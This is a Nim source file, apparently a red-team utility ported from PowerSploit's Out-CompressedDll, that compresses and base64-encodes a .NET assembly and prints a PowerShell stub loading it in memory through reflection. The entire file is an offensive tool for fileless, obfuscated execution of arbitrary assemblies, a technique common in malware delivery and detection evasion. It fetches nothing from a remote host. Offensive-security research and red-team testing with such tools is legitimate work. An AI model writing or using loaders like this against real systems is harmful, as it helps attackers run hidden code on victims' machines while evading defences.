#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause

    Compresses, Base-64 encodes and outputs PowerShell code to load a managed dll in memory. Port of the orignal PowerSploit script to Nim.

    Requires the zippy library ("nimble install zippy")

    References:
        - https://github.com/byt3bl33d3r/SILENTTRINITY/blob/master/silenttrinity/core/teamserver/utils.py#L22
        - https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-CompressedDll.ps1
]#

import zippy/[inflate, deflate]
import base64
import strformat
import os

proc dotnet_decode_and_inflate*(data: string): string =
    var decoded_data = decode(data)
    return cast[string](
        inflate(
            cast[seq[uint8]](decoded_data)
        )
    )

proc dotnet_deflate_and_encode*(data: string): string =
    var compressed_data = deflate(
        cast[seq[uint8]](data),
        level=9
    )
    return encode(compressed_data)

let cmd_line = commandLineParams()

if cmd_line.len != 1:
    echo "Ya need to give me a file dumb dumb"
    quit(1)

let assembly = readFile(cmd_line[0])

var deflated_assembly = dotnet_deflate_and_encode(assembly)

#var inflated_assembly = dotnet_decode_and_inflate(assembly)

var output = fmt"""
$EncodedCompressedFile = @'
{deflated_assembly}
'@
$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
$UncompressedFileBytes = New-Object Byte[]({assembly.len})
$DeflatedStream.Read($UncompressedFileBytes, 0, {assembly.len}) | Out-Null
[Reflection.Assembly]::Load($UncompressedFileBytes)
"""

echo output
